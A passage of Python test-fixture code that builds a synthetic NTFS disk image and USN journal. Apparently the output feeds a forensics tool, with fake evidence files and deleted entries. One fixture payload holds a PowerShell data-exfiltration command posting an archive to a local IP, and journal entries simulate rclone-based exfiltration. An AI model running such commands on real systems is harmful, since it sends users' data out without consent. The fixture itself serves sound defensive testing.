    img[vbr_off + 510:vbr_off + 512] = b"\x55\xAA"

    def build_mft_record(filename: str, parent_ref: int, in_use: bool, is_dir: bool,
                         created_dt: datetime, mod_dt: datetime, payload: bytes = b"",
                         non_resident_runs: Optional[bytes] = None, nr_size: int = 0) -> bytes:
        rec = bytearray(1024)
        rec[0:4] = b"FILE"
        struct.pack_into("<HH", rec, 4, 48, 3)
        struct.pack_into("<H", rec, 20, 56)
        flags = (0x01 if in_use else 0x00) | (0x02 if is_dir else 0x00)
        struct.pack_into("<H", rec, 22, flags)
        struct.pack_into("<HHH", rec, 48, 1, 0, 0)

        pos = 56
        si_body = struct.pack("<QQQQI", datetime_to_filetime(created_dt), datetime_to_filetime(mod_dt),
                              datetime_to_filetime(mod_dt), datetime_to_filetime(mod_dt), 0x20)
        si_len = 24 + len(si_body)
        struct.pack_into("<IIBBHHH", rec, pos, 0x10, si_len, 0, 0, 0, 24, 0)
        struct.pack_into("<I", rec, pos + 16, len(si_body))
        struct.pack_into("<H", rec, pos + 20, 24)
        rec[pos + 24:pos + 24 + len(si_body)] = si_body
        pos += si_len

        name_utf16 = filename.encode("utf-16le")
        fn_body = bytearray(66 + len(name_utf16))
        struct.pack_into("<Q", fn_body, 0, parent_ref)
        eff_size = nr_size if non_resident_runs else len(payload)
        struct.pack_into("<QQ", fn_body, 40, eff_size, eff_size)
        fn_body[64] = len(filename)
        fn_body[65] = 1
        fn_body[66:] = name_utf16
        fn_len = (24 + len(fn_body) + 7) & ~7
        struct.pack_into("<I", rec, pos, 0x30)
        struct.pack_into("<I", rec, pos + 4, fn_len)
        struct.pack_into("<I", rec, pos + 16, len(fn_body))
        struct.pack_into("<H", rec, pos + 20, 24)
        rec[pos + 24:pos + 24 + len(fn_body)] = fn_body
        pos += fn_len

        if non_resident_runs:
            attr_len = (64 + len(non_resident_runs) + 7) & ~7
            struct.pack_into("<IIBB", rec, pos, 0x80, attr_len, 1, 0)
            struct.pack_into("<H", rec, pos + 32, 64)
            struct.pack_into("<QQQ", rec, pos + 40, nr_size, nr_size, nr_size)
            rec[pos + 64:pos + 64 + len(non_resident_runs)] = non_resident_runs
            pos += attr_len
        elif not is_dir:
            data_len = (24 + len(payload) + 7) & ~7
            if pos + data_len + 4 <= 1024:
                struct.pack_into("<I", rec, pos, 0x80)
                struct.pack_into("<I", rec, pos + 4, data_len)
                struct.pack_into("<I", rec, pos + 16, len(payload))
                struct.pack_into("<H", rec, pos + 20, 24)
                rec[pos + 24:pos + 24 + len(payload)] = payload
                pos += data_len

        struct.pack_into("<I", rec, pos, 0xFFFFFFFF)
        struct.pack_into("<H", rec, 510, 1)
        struct.pack_into("<H", rec, 1022, 1)
        return bytes(rec)

    # MFT Fragment 1 at cluster 4 (records 0..7) + Fragment 2 at cluster 12 (records 8..11) -> tests Data Runs!
    mft_c4_off = vbr_off + 4 * 4096
    mft_c12_off = vbr_off + 12 * 4096
    # MFT Record 0 runlist: 2 clusters @ LCN 4 (0x11, 0x02, 0x04) + 1 cluster @ LCN 12 (+8 from 4) (0x11, 0x01, 0x08) + 0x00
    mft_runlist = bytes([0x11, 0x02, 0x04, 0x11, 0x01, 0x08, 0x00])

    # Non-resident file payload placed at cluster 20
    nr_payload = b"%PDF-1.7\n% Non-Resident Fragmented Evidence Stream\n" + (b"A" * 2048) + b"\n%%EOF"
    img[vbr_off + 20 * 4096:vbr_off + 20 * 4096 + len(nr_payload)] = nr_payload
    nr_runs = bytes([0x11, 0x01, 20, 0x00])

    now = datetime(2026, 11, 20, 14, 30, 0)
    frag1 = [
        (0, "$MFT", 5, True, False, now, now, b"", mft_runlist, 12 * 1024),
        (5, ".", 5, True, True, now, now, b"", None, 0),
        (6, "Users", 5, True, True, now, now, b"", None, 0),
        (7, "gizli_rapor.pdf", 6, True, False, datetime(2026, 11, 18, 9, 12), datetime(2026, 11, 19, 17, 45),
         b"", nr_runs, len(nr_payload)),
    ]
    frag2 = [
        (0, "musteri_export.xlsx", 6, True, False, datetime(2026, 11, 19, 10, 0), datetime(2026, 11, 19, 11, 20),
         b"PK\x03\x04\x14\x00\x06\x00[Content_Types].xml", None, 0),
        (1, "silinen_kanit.jpg", 6, False, False, datetime(2026, 11, 17, 21, 5), datetime(2026, 11, 17, 21, 8),
         b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00SYNTHETIC_JPEG_EVIDENCE\xFF\xD9", None, 0),
        (2, "silinen_betik.ps1", 6, False, False, datetime(2026, 11, 20, 2, 15), datetime(2026, 11, 20, 2, 16),
         b"Invoke-WebRequest -Uri http://10.0.0.5/exfil.zip -Method Post", None, 0),
    ]

    for idx, fname, pref, active, is_d, cdt, mdt, pay, runs, nsz in frag1:
        img[mft_c4_off + idx * 1024:mft_c4_off + (idx + 1) * 1024] = build_mft_record(
            fname, pref, active, is_d, cdt, mdt, pay, runs, nsz
        )
    for idx, fname, pref, active, is_d, cdt, mdt, pay, runs, nsz in frag2:
        img[mft_c12_off + idx * 1024:mft_c12_off + (idx + 1) * 1024] = build_mft_record(
            fname, pref, active, is_d, cdt, mdt, pay, runs, nsz
        )

    with open(output_path, "wb") as f:
        f.write(img)
    return output_path


def create_synthetic_usn_journal(output_path: str) -> str:
    """Create a synthetic NTFS $UsnJrnl:$J file containing USN_RECORD_V2 entries."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    buf = bytearray(4096)  # leading 4KB sparse zero block to test sparse skipping!

    entries = [
        (1000, datetime(2026, 11, 20, 19, 30, 1), 0x00000100 | 0x80000000, 36, 6, "rclone.exe"),
        (1088, datetime(2026, 11, 20, 19, 35, 14), 0x00000002 | 0x80000000, 37, 6, "exfil_archive.zip"),
        (1176, datetime(2026, 11, 20, 19, 44, 50), 0x00000200 | 0x80000000, 37, 6, "exfil_archive.zip"),
    ]

    for usn, dt, reason, fref, pref, fname in entries:
        fn_b = fname.encode("utf-16le")
        rec_len = (60 + len(fn_b) + 7) & ~7
        rec = bytearray(rec_len)
        struct.pack_into("<IHH", rec, 0, rec_len, 2, 0)
        struct.pack_into("<QQQ", rec, 8, fref, pref, usn)
        struct.pack_into("<Q", rec, 32, datetime_to_filetime(dt))
        struct.pack_into("<I", rec, 40, reason)
        struct.pack_into("<HH", rec, 56, len(fn_b), 60)
        rec[60:60 + len(fn_b)] = fn_b
        buf.extend(rec)

    with open(output_path, "wb") as f:
        f.write(buf)
    return output_path
